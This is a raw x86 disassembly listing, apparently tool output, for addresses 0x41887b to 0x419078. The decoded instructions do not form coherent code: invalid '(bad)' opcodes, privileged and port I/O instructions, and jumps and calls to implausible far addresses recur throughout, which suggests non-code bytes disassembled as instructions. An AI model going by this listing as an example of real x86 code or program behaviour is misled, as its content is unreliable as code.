  41887b:	jb     0x418872
  41887d:	lea    eax,[ecx+0x5e]
  418880:	and    eax,0x4725cc38
  418885:	in     eax,0x82
  418887:	int    0x4c
  418889:	xchg   ebx,eax
  41888a:	aad    0x69
  41888c:	outs   dx,DWORD PTR ds:[esi]
  41888d:	adc    DWORD PTR ds:0xfa1fa566,ebx
  418893:	xchg   ebp,eax
  418894:	xor    DWORD PTR [ebp-0x7c51b394],edi
  41889a:	dec    eax
  41889b:	xchg   esi,eax
  41889c:	sub    al,0xeb
  41889e:	dec    esp
  41889f:	inc    ecx
  4188a0:	scas   al,BYTE PTR es:[edi]
  4188a1:	mov    DWORD PTR [edi+0x43e49855],esi
  4188a7:	pop    eax
  4188a8:	jnp    0x4188b4
  4188aa:	xchg   edx,eax
  4188ab:	sub    al,0x5a
  4188ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4188ae:	push   es
  4188af:	push   edx
  4188b0:	cmp    edx,ebp
  4188b2:	xchg   edx,eax
  4188b3:	ret    0x7f62
  4188b6:	test   al,0xbb
  4188b8:	xor    al,0x1c
  4188ba:	pop    esi
  4188bb:	not    DWORD PTR [ecx+ebx*8+0x4dc755c]
  4188c2:	out    dx,al
  4188c3:	pushf  
  4188c4:	loop   0x4188fb
  4188c6:	fistp  WORD PTR [ecx-0x227166c9]
  4188cc:	or     DWORD PTR [esi],0x4ac0f1c0
  4188d2:	mov    ebp,0xff771c51
  4188d7:	ds aam 0x53
  4188da:	cwde   
  4188db:	(bad)  
  4188dc:	into   
  4188dd:	mov    edx,0x57b127b4
  4188e2:	mov    fs:0x6b09a0ff,eax
  4188e8:	pop    edx
  4188e9:	stos   BYTE PTR es:[edi],al
  4188ea:	sbb    dl,BYTE PTR [ecx-0x4f9a6219]
  4188f0:	push   eax
  4188f1:	add    BYTE PTR [eax+eax*8-0x202219a9],bh
  4188f8:	jnp    0x4188aa
  4188fa:	jmp    0xa4cf5cae
  4188ff:	push   ecx
  418900:	inc    esp
  418901:	and    DWORD PTR [eax],edx
  418903:	dec    ebx
  418904:	shr    BYTE PTR [ebp-0x4735b385],cl
  41890a:	cmp    DWORD PTR [edx-0x5829202c],ebp
  418910:	mov    dl,0xf8
  418912:	pop    ebx
  418913:	or     DWORD PTR [edx-0x24],ecx
  418916:	pop    ecx
  418917:	sbb    BYTE PTR ds:0xfde61143,ah
  41891d:	push   ebx
  41891e:	xchg   BYTE PTR [esp+eax*1-0x602795a8],ch
  418925:	fwait
  418926:	(bad)  
  418927:	jmp    0x418972
  418929:	mov    esi,0xf68b5144
  41892e:	ss jl  0x418942
  418931:	mov    eax,ds:0x8d47dd14
  418936:	fidiv  WORD PTR [esi+0x15560743]
  41893c:	dec    eax
  41893d:	xor    al,0xa2
  41893f:	out    0x2d,al
  418941:	xor    bl,BYTE PTR gs:[ebx-0x4a]
  418945:	mov    ds:0x1a522718,al
  41894a:	scas   eax,DWORD PTR es:[edi]
  41894b:	fisttp DWORD PTR [edi]
  41894d:	pop    ebx
  41894e:	out    dx,eax
  41894f:	sbb    BYTE PTR [esi+edx*2],ah
  418952:	cli    
  418953:	pop    edi
  418954:	mov    ds:0xf8b1b1c9,al
  418959:	cmp    DWORD PTR [eax],ebx
  41895b:	test   BYTE PTR [edi+0x48bbf7fc],cl
  418961:	retf   0xb9b0
  418964:	dec    edi
  418965:	mov    ebx,0x7064124
  41896a:	aad    0x1c
  41896c:	das    
  41896d:	retf   
  41896e:	add    bl,BYTE PTR [eax]
  418970:	je     0x41893d
  418972:	dec    edi
  418973:	cmc    
  418974:	xor    BYTE PTR [eax-0x22],cl
  418977:	or     eax,0x12222355
  41897c:	fsubr  DWORD PTR [esi-0x1851fd63]
  418982:	sub    bh,BYTE PTR [edi-0x6e]
  418985:	add    esp,DWORD PTR ds:0x285343ed
  41898b:	popf   
  41898c:	in     al,dx
  41898d:	enter  0x2886,0x2f
  418991:	(bad)  
  418992:	ja     0x41891d
  418994:	xchg   ah,cl
  418996:	jle    0x41891a
  418998:	jge    0x418952
  41899a:	aad    0x43
  41899c:	js     0x4189be
  41899e:	sub    dl,dl
  4189a0:	or     BYTE PTR [edx-0x65455083],bl
  4189a6:	adc    ebx,DWORD PTR [ecx-0x3d]
  4189a9:	stos   BYTE PTR es:[edi],al
  4189aa:	(bad)  
  4189ab:	cmc    
  4189ac:	jne    0x418964
  4189ae:	imul   esp,DWORD PTR [ebx+edi*2-0x6e36ae7d],0x8deed393
  4189b9:	push   esp
  4189ba:	adc    eax,0x92124764
  4189bf:	(bad)  [edx]
  4189c1:	mov    dl,0xa1
  4189c3:	xchg   edx,eax
  4189c4:	cld    
  4189c5:	bound  esi,QWORD PTR [edi+0x30]
  4189c8:	mov    edi,0x7e48c2dd
  4189cd:	(bad)  
  4189ce:	out    dx,eax
  4189cf:	inc    ebx
  4189d0:	adc    cl,BYTE PTR [ebx+0x1a67a59e]
  4189d6:	fld    DWORD PTR [edx]
  4189d8:	fidiv  DWORD PTR ds:0xe8c123bb
  4189de:	mov    edx,0x8306fb3e
  4189e3:	add    al,0x42
  4189e5:	cwde   
  4189e6:	leave  
  4189e7:	nop
  4189e8:	mov    ds,ebx
  4189ea:	rol    DWORD PTR [esi+0x79],0xec
  4189ee:	ins    BYTE PTR es:[edi],dx
  4189ef:	scas   al,BYTE PTR es:[edi]
  4189f0:	(bad)  
  4189f1:	mov    edi,0xaec3d679
  4189f6:	mov    bh,0xf
  4189f8:	push   ecx
  4189f9:	lods   al,BYTE PTR ds:[esi]
  4189fa:	mov    edx,ebp
  4189fc:	mov    ecx,0x85c62ad4
  418a01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418a02:	mov    dh,0x46
  418a04:	(bad)  
  418a06:	jb     0x4189c3
  418a08:	jmp    0x733a:0x6f68738f
  418a0f:	in     al,dx
  418a10:	xchg   edx,eax
  418a11:	cmp    BYTE PTR [esi+0x2ab54856],al
  418a17:	xor    eax,0xdcfb2cfc
  418a1c:	shl    edx,0x59
  418a1f:	and    BYTE PTR [ecx-0x685b4014],bl
  418a25:	test   eax,0xb60988d6
  418a2a:	mov    eax,ds:0x412b907e
  418a2f:	cmp    esp,DWORD PTR [eax]
  418a31:	hlt    
  418a32:	pusha  
  418a33:	popf   
  418a34:	int    0x21
  418a36:	loope  0x418a5c
  418a38:	mov    dl,0x2a
  418a3a:	sbb    esp,DWORD PTR [edx+0x4cc46998]
  418a40:	shl    DWORD PTR [edx+0xddf2152],cl
  418a46:	fild   WORD PTR [eax-0x27d6e36b]
  418a4c:	ds cld 
  418a4e:	or     al,al
  418a50:	in     al,dx
  418a51:	out    dx,al
  418a52:	dec    edx
  418a53:	jb     0x418a00
  418a55:	mov    bl,0x6e
  418a57:	shl    BYTE PTR [ecx-0x52],cl
  418a5a:	jnp    0x418a72
  418a5c:	add    eax,0x8be214bd
  418a61:	(bad)  
  418a62:	cmp    bh,BYTE PTR [esi+eiz*2]
  418a65:	inc    edi
  418a66:	xchg   ebx,eax
  418a67:	mov    ah,0xba
  418a69:	dec    edi
  418a6a:	ret    0xb56d
  418a6d:	mov    al,ds:0xae5f9ebb
  418a72:	mov    ds:0xe6e2d5b3,al
  418a77:	sbb    DWORD PTR [edx-0xe7587b9],ebp
  418a7d:	dec    eax
  418a7e:	out    0x2f,al
  418a80:	xor    DWORD PTR [eax+0x59ec16d5],eax
  418a86:	in     al,0xc9
  418a88:	pop    esi
  418a89:	icebp  
  418a8a:	loope  0x418aeb
  418a8c:	test   BYTE PTR [ebx-0x345458be],bh
  418a92:	jg     0x418a87
  418a94:	loopne 0x418b0b
  418a96:	imul   esi,DWORD PTR ds:0x6658c13a,0x7d
  418a9d:	ins    BYTE PTR es:[edi],dx
  418a9e:	jge    0x418acd
  418aa0:	and    bl,BYTE PTR [ebp+edx*4-0xe]
  418aa4:	sahf   
  418aa5:	imul   esp,edx,0xdae0ebed
  418aab:	sbb    al,0x99
  418aad:	fwait
  418aae:	pop    ebp
  418aaf:	imul   ebp,ebp,0x30fdc99d
  418ab5:	not    DWORD PTR [ebx+0x4e]
  418ab8:	jmp    0x8d0f:0x32b4994e
  418abf:	mov    eax,ds:0x11b15bbb
  418ac4:	add    ch,BYTE PTR [edx-0x7]
  418ac7:	push   es
  418ac8:	in     eax,dx
  418ac9:	clc    
  418aca:	xor    eax,0xc58f9606
  418acf:	sub    al,0x10
  418ad1:	aam    0x3e
  418ad3:	sbb    al,0x3c
  418ad5:	xlat   BYTE PTR ds:[ebx]
  418ad6:	push   edi
  418ad7:	in     eax,dx
  418ad8:	inc    eax
  418ad9:	add    DWORD PTR [edx],esp
  418adb:	or     al,0x4a
  418add:	cmp    al,0x44
  418adf:	dec    ebp
  418ae0:	jp     0x418b43
  418ae2:	ficomp WORD PTR [edx-0x71]
  418ae5:	rcr    BYTE PTR [edx],1
  418ae7:	push   ss
  418ae8:	dec    edi
  418ae9:	shr    ecx,0x3
  418aec:	inc    esi
  418aed:	push   edx
  418aee:	cmp    BYTE PTR [edi],dl
  418af0:	sub    ch,cl
  418af2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418af3:	call   0xe1fe3295
  418af8:	lahf   
  418af9:	lds    esi,FWORD PTR [esi-0x6dec208b]
  418aff:	mov    eax,ds:0xa0923fce
  418b04:	sub    eax,0x8a769c25
  418b09:	leave  
  418b0a:	sahf   
  418b0b:	xchg   edi,eax
  418b0c:	jp     0x418b3b
  418b0e:	fadd   st(2),st
  418b10:	test   al,0x45
  418b12:	cwde   
  418b13:	repz ds inc eax
  418b16:	pop    ecx
  418b17:	inc    esp
  418b18:	push   eax
  418b19:	mov    ds:0xd8d4e14b,eax
  418b1e:	push   0xc8cba8f7
  418b23:	jno    0x418b22
  418b25:	xchg   ecx,eax
  418b26:	fisttp DWORD PTR [edx+0x550dcccd]
  418b2c:	pusha  
  418b2d:	js     0x418ace
  418b2f:	fild   QWORD PTR [edx+ebx*1-0x79]
  418b33:	in     eax,0x18
  418b35:	adc    ebx,DWORD PTR ss:[ecx-0x749d2f5a]
  418b3c:	xor    BYTE PTR [ecx-0x7511828a],dh
  418b42:	test   eax,0xa25c69df
  418b47:	pop    edx
  418b48:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418b49:	cli    
  418b4a:	cmp    BYTE PTR [ebx],dh
  418b4c:	dec    edx
  418b4d:	jnp    0x418b07
  418b4f:	not    BYTE PTR [ebx]
  418b51:	dec    esp
  418b52:	gs xchg ecx,eax
  418b54:	pop    es
  418b55:	sub    BYTE PTR [eax+0x45],dl
  418b58:	je     0x418b8a
  418b5a:	xchg   ecx,eax
  418b5b:	push   edi
  418b5c:	ret    0xa5df
  418b5f:	jg     0x418b12
  418b61:	shl    DWORD PTR [edx-0x741c5a40],1
  418b67:	cs inc eax
  418b69:	js     0x418ba7
  418b6b:	test   eax,0xb1ddbb5b
  418b70:	jns    0x418b91
  418b72:	and    ebx,DWORD PTR [esi-0x23]
  418b75:	mov    ecx,0x5dcfeb9
  418b7a:	(bad)  
  418b7b:	xlat   BYTE PTR ds:[ebx]
  418b7c:	mov    ds:0x4d936ef,al
  418b81:	add    eax,0x7500c9fd
  418b86:	sar    BYTE PTR [esi],cl
  418b88:	icebp  
  418b89:	clc    
  418b8a:	(bad)  
  418b8b:	sbb    ebp,ebx
  418b8d:	push   edi
  418b8e:	xor    eax,0xa4698591
  418b93:	sbb    ebx,esi
  418b95:	jmp    0x418b1b
  418b97:	popf   
  418b98:	mov    bh,0x13
  418b9a:	leave  
  418b9b:	mov    eax,ds:0x4c9f32a8
  418ba0:	scas   eax,DWORD PTR es:[edi]
  418ba1:	repnz in eax,dx
  418ba3:	test   eax,0x27e9a5c5
  418ba8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418ba9:	aad    0xc
  418bab:	popf   
  418bac:	adc    al,0xea
  418bae:	inc    eax
  418baf:	sbb    ebx,DWORD PTR [eax]
  418bb1:	jb     0x418c0a
  418bb3:	push   ebx
  418bb4:	test   al,0xa0
  418bb6:	add    al,0x86
  418bb8:	rcr    ebp,0x8c
  418bbb:	and    ecx,edi
  418bbd:	fdivr  QWORD PTR [ebp+0x7b1ce35a]
  418bc3:	sbb    al,0xbf
  418bc5:	cmp    edi,DWORD PTR ds:0x5674baa8
  418bcb:	jge    0x418c08
  418bcd:	enter  0x81,0x38
  418bd1:	pusha  
  418bd2:	sub    eax,0x2457e018
  418bd7:	mov    ch,BYTE PTR [edi-0x73]
  418bda:	jmp    0x16239727
  418bdf:	or     al,0xd9
  418be1:	in     al,dx
  418be2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418be3:	pop    ebp
  418be4:	xlat   BYTE PTR ds:[ebx]
  418be5:	pop    edi
  418be6:	ds (bad) 
  418be8:	inc    ecx
  418be9:	mov    cl,0xc
  418beb:	sbb    al,0x74
  418bed:	jg     0x418baf
  418bef:	sbb    eax,0xd0899275
  418bf4:	adc    al,0x90
  418bf6:	xchg   ecx,eax
  418bf7:	jae    0x418bcd
  418bf9:	adc    al,BYTE PTR ds:0xdb51492
  418bff:	pop    esp
  418c00:	lahf   
  418c01:	enter  0x99ee,0xc3
  418c05:	sub    dl,BYTE PTR [edi-0x78]
  418c08:	push   ds
  418c09:	cmp    ch,ch
  418c0b:	mov    DWORD PTR [ebp+0xda5fd3],esp
  418c11:	sbb    eax,0x89e78af8
  418c16:	xchg   ebp,eax
  418c17:	es in  eax,dx
  418c19:	clc    
  418c1a:	fidiv  WORD PTR [ecx-0x7a]
  418c1d:	push   edi
  418c1e:	xor    ebp,esi
  418c20:	and    BYTE PTR [edi-0x59f78140],0xac
  418c27:	outs   dx,DWORD PTR ds:[esi]
  418c28:	dec    edi
  418c29:	mov    ds,WORD PTR ds:0x7f140b2
  418c2f:	js     0x418c93
  418c31:	push   edx
  418c32:	mov    eax,ds:0x5e9c796b
  418c37:	xor    DWORD PTR [ecx],ebx
  418c39:	add    al,0xb
  418c3b:	mov    ch,0x78
  418c3d:	pop    ds
  418c3e:	sub    DWORD PTR [eax],esp
  418c40:	or     al,0x92
  418c42:	stos   BYTE PTR es:[edi],al
  418c43:	mov    ss,eax
  418c45:	sar    DWORD PTR [ebp-0x7],cl
  418c48:	scas   al,BYTE PTR es:[edi]
  418c49:	mov    al,ds:0x439914c6
  418c4e:	cwde   
  418c4f:	sar    BYTE PTR [edi-0x5f],0xe1
  418c53:	dec    esi
  418c54:	leave  
  418c55:	xchg   cx,ax
  418c57:	mov    ebp,0x507c870c
  418c5c:	lods   eax,DWORD PTR ds:[esi]
  418c5d:	push   eax
  418c5e:	xor    cl,bh
  418c60:	mov    WORD PTR [ecx-0x30],es
  418c63:	stc    
  418c64:	sbb    BYTE PTR [edi+0x2b306d6a],dh
  418c6a:	int    0x58
  418c6c:	repz jne 0x418c33
  418c6f:	dec    edx
  418c70:	push   ss
  418c71:	sahf   
  418c72:	sub    al,0xfb
  418c74:	mov    esp,esp
  418c76:	pop    edi
  418c77:	lods   al,BYTE PTR gs:[esi]
  418c79:	add    eax,0xc6cee968
  418c7e:	mov    bh,BYTE PTR [edi+0xa]
  418c81:	mov    ds:0x6c79734a,eax
  418c86:	and    al,0xa2
  418c88:	or     al,0xd4
  418c8a:	adc    eax,esi
  418c8c:	imul   esp,DWORD PTR fs:[eax+esi*1+0x65],0xb50f483d
  418c95:	popf   
  418c96:	cmp    eax,DWORD PTR [ecx-0x43]
  418c99:	dec    esi
  418c9a:	add    ecx,DWORD PTR [edi]
  418c9c:	dec    ebx
  418c9d:	mov    DWORD PTR [edi-0x19],ebx
  418ca0:	xchg   esi,eax
  418ca1:	fisubr DWORD PTR [esi-0x7a67fd78]
  418ca7:	enter  0x3bc5,0x2f
  418cab:	icebp  
  418cac:	icebp  
  418cad:	mov    esp,0xf4e02384
  418cb2:	outs   dx,DWORD PTR ds:[esi]
  418cb3:	jmp    0x9a2a22a9
  418cb8:	cmp    eax,0x11f98b10
  418cbd:	mov    cl,0xc7
  418cbf:	dec    edx
  418cc0:	ror    DWORD PTR [eax+eiz*4],1
  418cc3:	cdq    
  418cc4:	rcr    DWORD PTR [edi+0x76c730d6],0x2e
  418ccb:	fimul  WORD PTR [ebx+0x35601a46]
  418cd1:	and    BYTE PTR [ecx+0x6a],ch
  418cd4:	mov    ah,0xe9
  418cd6:	and    eax,0xfa24df8
  418cdb:	jmp    0xe38a:0x2e5c93c9
  418ce2:	sbb    bl,BYTE PTR [ebx-0x34]
  418ce5:	pushf  
  418ce6:	sbb    eax,DWORD PTR [ecx]
  418ce8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418ce9:	sub    BYTE PTR [eax-0x1330dd37],bl
  418cef:	dec    eax
  418cf0:	sub    al,0xba
  418cf2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418cf3:	and    eax,0xa04957bc
  418cf8:	dec    esi
  418cf9:	and    eax,0xe2c456d8
  418cfe:	fisubr WORD PTR [ebp+0x452497b]
  418d04:	cwde   
  418d05:	cs jns 0x418d4b
  418d08:	addr16 out 0x55,al
  418d0b:	push   ebp
  418d0c:	(bad)  
  418d0d:	pop    ebp
  418d0e:	push   esi
  418d0f:	mov    ecx,0xe57cbf68
  418d14:	out    dx,al
  418d15:	pop    ecx
  418d16:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418d17:	gs pop es
  418d19:	rcl    DWORD PTR [ecx+0x3a],1
  418d1c:	clc    
  418d1d:	out    0xb1,al
  418d1f:	add    esi,DWORD PTR [edi+eiz*4+0x2faae1e5]
  418d26:	mov    dl,BYTE PTR [ebp+0x1c]
  418d29:	push   edi
  418d2a:	sbb    eax,ecx
  418d2c:	pushf  
  418d2d:	mov    al,0xcf
  418d2f:	cmp    eax,0x20042063
  418d34:	pop    edx
  418d35:	adc    eax,0x1f12c7a0
  418d3a:	data16 rol BYTE PTR [eax],cl
  418d3d:	inc    edi
  418d3e:	fisttp QWORD PTR [ebp+ebx*1-0x64]
  418d42:	int    0x5d
  418d44:	mov    bl,0xf1
  418d46:	arpl   WORD PTR [eax+0x16],ax
  418d49:	push   es
  418d4a:	sbb    al,0x10
  418d4c:	dec    ecx
  418d4d:	aam    0x4f
  418d4f:	fnstcw WORD PTR [edi-0x1c75cb2f]
  418d55:	jecxz  0x418dbe
  418d57:	xlat   BYTE PTR ds:[ebx]
  418d58:	mov    ecx,0x402fc2b7
  418d5d:	out    dx,al
  418d5e:	inc    BYTE PTR [edx+0x7359436d]
  418d64:	stc    
  418d65:	adc    DWORD PTR [ebx],edx
  418d67:	(bad)  
  418d68:	sbb    eax,0xa2db9c5
  418d6d:	sub    eax,0x23ca18cb
  418d72:	cmp    eax,0x6d7e8dd1
  418d77:	clc    
  418d78:	rdpmc  
  418d7a:	test   dl,ah
  418d7c:	stc    
  418d7d:	pusha  
  418d7e:	leave  
  418d7f:	not    BYTE PTR [eax]
  418d81:	div    DWORD PTR [ebp-0x38]
  418d84:	mov    WORD PTR [ebx+0x20],fs
  418d87:	retf   
  418d88:	popa   
  418d89:	mov    eax,0xdc3b032f
  418d8e:	xchg   esp,eax
  418d8f:	dec    edi
  418d90:	and    BYTE PTR [ebx+0x44],ch
  418d93:	sbb    BYTE PTR [ebp-0x655d61a1],ah
  418d99:	pop    ebp
  418d9a:	ror    DWORD PTR [ebp+0x75],1
  418d9d:	in     al,0xa9
  418d9f:	div    DWORD PTR [esp+ecx*2+0x4666a4cd]
  418da6:	mov    dh,0x3f
  418da8:	xor    bl,BYTE PTR [eax-0x6cf38b70]
  418dae:	jmp    0xb07d82bd
  418db3:	int    0x76
  418db5:	xchg   esp,eax
  418db6:	xor    esi,DWORD PTR [esi-0x49bcd717]
  418dbc:	mov    al,ds:0xbb9ab8bb
  418dc1:	sub    ah,BYTE PTR [esi]
  418dc3:	xchg   ebp,eax
  418dc4:	jle    0x418d99
  418dc6:	jl     0x418dd6
  418dc8:	mov    ebx,ds
  418dca:	(bad)  
  418dcb:	gs std 
  418dcd:	lahf   
  418dce:	or     eax,0xe74c2c4a
  418dd3:	rcr    DWORD PTR fs:[ebx-0x70],cl
  418dd7:	adc    BYTE PTR ds:0x1a865055,bl
  418ddd:	enter  0xec5a,0xc0
  418de1:	sbb    cl,ch
  418de3:	gs (bad) 
  418de5:	pushf  
  418de6:	push   edx
  418de7:	sub    cl,BYTE PTR [esi+0x1d]
  418dea:	push   ebp
  418deb:	dec    esp
  418dec:	in     eax,dx
  418ded:	daa    
  418dee:	sahf   
  418def:	fsubp  st(6),st
  418df1:	mov    dh,0x80
  418df3:	mov    ch,0x58
  418df5:	pop    esi
  418df6:	sub    ch,BYTE PTR [ebp+edx*4-0x62439a33]
  418dfd:	jl     0x418e5c
  418dff:	call   0xa417:0xdc8b
  418e05:	mov    ds:0x3c126f60,al
  418e0a:	cmp    DWORD PTR [ebp+0xf06bcdc],0xd774789f
  418e14:	push   ebp
  418e15:	add    esi,esp
  418e17:	mov    es,WORD PTR [ebx+0x78ff18]
  418e1d:	fdivr  QWORD PTR [ebx]
  418e1f:	mov    esi,0xf84a2460
  418e24:	mov    edi,0x61247dac
  418e29:	cmp    BYTE PTR [eax],cl
  418e2b:	int3   
  418e2c:	push   edx
  418e2d:	jge    0x418e71
  418e2f:	mov    edx,0x22b2efc7
  418e34:	sti    
  418e35:	mov    ah,0x67
  418e37:	ins    DWORD PTR es:[edi],dx
  418e38:	pop    edi
  418e39:	mov    al,ds:0x57382223
  418e3e:	jns    0x418e40
  418e40:	fisub  DWORD PTR [ebp-0x29]
  418e43:	mov    al,ds:0xe68e286a
  418e48:	not    cl
  418e4a:	mov    esp,0x2249833b
  418e4f:	rol    edx,1
  418e51:	adc    ah,BYTE PTR [bp+si+0x4e6a]
  418e56:	fiadd  WORD PTR [ecx-0x4]
  418e59:	rcl    DWORD PTR [edx+0x5d6f1840],0x6c
  418e60:	add    eax,0x7522974d
  418e65:	scas   al,BYTE PTR es:[edi]
  418e66:	test   eax,0x434c5f49
  418e6b:	pop    ebp
  418e6c:	jns    0x418e51
  418e6e:	push   esp
  418e6f:	or     bl,ah
  418e71:	cdq    
  418e72:	repz sti 
  418e74:	mov    ds:0x1d49f0cd,eax
  418e79:	loopne 0x418e6d
  418e7b:	inc    eax
  418e7c:	jmp    ebx
  418e7e:	mov    esi,0x213c7476
  418e83:	fstp   DWORD PTR [eax]
  418e85:	cdq    
  418e86:	push   esi
  418e87:	jp     0x418e76
  418e89:	je     0x418e44
  418e8b:	ret    0xac7e
  418e8e:	rcpss  xmm2,xmm3
  418e92:	dec    eax
  418e93:	mov    ch,0x61
  418e95:	mov    ?,WORD PTR [edi]
  418e97:	dec    ebx
  418e98:	icebp  
  418e99:	mov    BYTE PTR [edx],ch
  418e9b:	mov    dl,0x0
  418e9d:	or     eax,0x1a
  418ea0:	call   0xda9f9f78
  418ea5:	push   es
  418ea6:	inc    ebp
  418ea7:	inc    esp
  418ea8:	call   0x6cc80a64
  418ead:	scas   al,BYTE PTR es:[edi]
  418eae:	add    ebx,ebp
  418eb0:	stos   BYTE PTR es:[edi],al
  418eb1:	punpckhbw mm6,QWORD PTR [ebx+0xa]
  418eb5:	push   cs
  418eb6:	repnz inc ebp
  418eb8:	pushf  
  418eb9:	fisubr DWORD PTR [edx-0x3d5dfbbc]
  418ebf:	(bad)  
  418ec0:	ror    DWORD PTR [edi+0x4ef634c9],cl
  418ec6:	pop    edx
  418ec7:	dec    esp
  418ec8:	jmp    0x418e52
  418eca:	(bad)  
  418ecb:	adc    esp,DWORD PTR [eax-0x28946ecb]
  418ed1:	cld    
  418ed2:	(bad)  
  418ed4:	push   ds
  418ed5:	nop
  418ed6:	mov    DWORD PTR [ebp-0x17ee131e],ecx
  418edc:	xor    al,0x40
  418ede:	nop
  418edf:	or     ebp,esi
  418ee1:	inc    eax
  418ee2:	jl     0x418ef0
  418ee4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418ee5:	sub    ebx,DWORD PTR [eax+0x513437e3]
  418eeb:	fcomi  st,st(5)
  418eed:	xchg   ecx,eax
  418eee:	inc    edx
  418eef:	inc    ecx
  418ef0:	pop    ds
  418ef1:	xchg   ebx,eax
  418ef2:	jmp    0x638f:0x99ce5b2a
  418ef9:	stos   BYTE PTR es:[edi],al
  418efa:	mov    ebp,0xcc37b7da
  418eff:	jle    0x418f4c
  418f01:	ja     0x418f05
  418f03:	js     0x418f75
  418f05:	sar    ebx,0xad
  418f08:	pop    edi
  418f09:	leave  
  418f0a:	adc    eax,0xffffffec
  418f0d:	jl     0x418f63
  418f0f:	lds    ebx,FWORD PTR [edi-0xcb3c4b5]
  418f15:	pop    ebp
  418f16:	jl     0x418f63
  418f18:	nop
  418f19:	cs out 0xbd,eax
  418f1c:	pushf  
  418f1d:	xchg   ebp,eax
  418f1e:	jmp    0x418f3f
  418f20:	xchg   edi,eax
  418f21:	scas   al,BYTE PTR es:[edi]
  418f22:	ins    BYTE PTR es:[edi],dx
  418f23:	push   ebp
  418f24:	clc    
  418f25:	das    
  418f26:	lds    ecx,FWORD PTR [ecx+edi*8-0x11]
  418f2a:	repnz cdq 
  418f2c:	rol    DWORD PTR [ebp+0x5518896f],cl
  418f32:	xor    eax,0x330a7ae0
  418f37:	or     BYTE PTR [ecx-0x23],al
  418f3a:	adc    ch,ch
  418f3c:	sbb    al,0xd0
  418f3e:	in     al,dx
  418f3f:	mov    eax,0x92d0c94
  418f44:	inc    ebp
  418f45:	pop    ss
  418f46:	mov    ecx,?
  418f48:	out    dx,al
  418f49:	mov    ebp,0x224ff4d2
  418f4e:	mov    esp,0x9c683632
  418f53:	push   0x69
  418f55:	(bad)  
  418f56:	sti    
  418f57:	je     0x418f4c
  418f59:	(bad)  
  418f5a:	sub    BYTE PTR [esi+0x11b1003],bh
  418f60:	clc    
  418f61:	cdq    
  418f62:	adc    ch,BYTE PTR [esi]
  418f64:	xchg   edx,eax
  418f65:	xor    BYTE PTR [edi+0x4b],dh
  418f68:	sbb    bh,dh
  418f6a:	jmp    0x418f85
  418f6c:	sub    DWORD PTR [eax-0x58],edx
  418f6f:	xlat   BYTE PTR ds:[ebx]
  418f70:	leave  
  418f71:	bound  esi,QWORD PTR [ebx-0x70]
  418f74:	xchg   ebx,eax
  418f75:	loope  0x418f4c
  418f77:	add    ebp,edi
  418f79:	(bad)  
  418f7a:	jle    0x418f0e
  418f7c:	fs mov ds,esi
  418f7f:	jmp    esi
  418f81:	imul   esp,DWORD PTR [esi-0x2e3ad211],0xfffffff4
  418f88:	call   0x472:0xc04c275a
  418f8f:	cmp    al,0xd5
  418f91:	rol    ch,cl
  418f93:	dec    ebp
  418f94:	add    al,0x4b
  418f96:	xor    BYTE PTR [eax],dh
  418f98:	std    
  418f99:	add    BYTE PTR [ecx-0x43],ah
  418f9c:	jmp    FWORD PTR [ebx-0x16b97ffd]
  418fa2:	shr    DWORD PTR cs:[esi],1
  418fa5:	test   eax,0x2c788e1a
  418faa:	mov    BYTE PTR [esi+eax*2-0x4488ef50],dl
  418fb1:	mov    bl,0x80
  418fb3:	lds    edi,FWORD PTR [eax+esi*8-0x5b]
  418fb7:	xchg   edx,eax
  418fb8:	mov    ecx,0x411d0831
  418fbd:	cmp    al,0x18
  418fbf:	sub    BYTE PTR [ebx+eax*4-0x3d],0xb6
  418fc4:	mov    WORD PTR [edx+0x16286298],ss
  418fca:	adc    ch,BYTE PTR [edx-0x10]
  418fcd:	rcl    DWORD PTR [esi],0x8a
  418fd0:	jbe    0x419042
  418fd2:	and    esi,DWORD PTR [esi]
  418fd4:	lock add ecx,0x25e0ef9a
  418fdb:	out    dx,eax
  418fdc:	daa    
  418fdd:	fcomp  DWORD PTR [edx+ebx*1+0x701f51eb]
  418fe4:	pop    ss
  418fe5:	inc    ecx
  418fe6:	rcr    DWORD PTR [si],cl
  418fe9:	cmp    BYTE PTR [esi],0x3
  418fec:	and    dh,cl
  418fee:	dec    eax
  418fef:	add    bh,ah
  418ff1:	and    bh,BYTE PTR [esp+eiz*4+0x48d3c055]
  418ff8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418ff9:	and    DWORD PTR ds:0xb398a4b6,esp
  418fff:	(bad)  
  419000:	jmp    0x5e04:0x27caa165
  419007:	add    al,0x2e
  419009:	mul    BYTE PTR [eax+ebp*8-0x689957c7]
  419010:	xor    DWORD PTR [ebp+ecx*8-0x39705a12],0xffffff98
  419018:	jno    0x418fee
  41901a:	cli    
  41901b:	or     DWORD PTR [ebx+0x266ae300],0x4d
  419022:	xor    BYTE PTR [ecx+0x46],cl
  419025:	call   0x5180:0x62823851
  41902c:	mov    dl,0xb6
  41902e:	push   esi
  41902f:	xor    eax,0xdfc3a69e
  419034:	jbe    0x419091
  419036:	mov    cl,0xe6
  419038:	push   esp
  419039:	mov    WORD PTR [edx],cs
  41903b:	adc    al,0xea
  41903d:	add    eax,0x441ccdec
  419042:	rcr    BYTE PTR [ecx-0x53],cl
  419045:	xchg   ecx,eax
  419046:	push   esp
  419047:	sub    eax,DWORD PTR [ecx]
  419049:	sbb    dh,BYTE PTR [edi+esi*4-0x1a1b47e4]
  419050:	jl     0x419047
  419052:	fiadd  DWORD PTR [edx-0x72d68abb]
  419058:	push   0xffffffe5
  41905a:	jns    0x4190d9
  41905c:	test   DWORD PTR [ebx],0x35ae6e12
  419062:	ret    0x67ea
  419065:	je     0x4190ae
  419067:	jb     0x41900a
  419069:	(bad)  [ecx+esi*8]
  41906c:	js     0x41907b
  41906e:	inc    ecx
  41906f:	das    
  419070:	mov    edx,0x315fd4d0
  419075:	aad    0x29
  419077:	icebp  
  419078:	stos   BYTE PTR es:[edi],al
